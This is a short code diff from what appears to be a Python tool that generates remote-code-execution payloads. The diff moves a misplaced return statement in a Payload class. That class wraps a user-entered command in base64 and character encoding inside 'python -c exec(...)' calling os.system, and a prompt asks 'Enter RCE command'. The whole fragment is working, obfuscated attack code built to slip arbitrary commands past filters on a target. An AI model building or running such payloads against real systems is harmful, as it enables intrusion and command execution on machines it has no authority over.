@@ -70,9 +70,10 @@ class Payload(object):
         if self.quotes:
             cmd = self.prefix+"python -c exec({})".format(self.chr_encode("__import__('os').system"
                                                                                "(__import__('base64').b64decode({})"
-        return cmd                                                                       ".decode('utf-8'))".
+                                                                              ".decode('utf-8'))".
                                                                                format(b64encode(bytes(self.cmd, 'utf-8')
                                                                                                 ))))
+        return cmd 
 
 if __name__ == "__main__":
     cmd = input("Enter RCE command :")
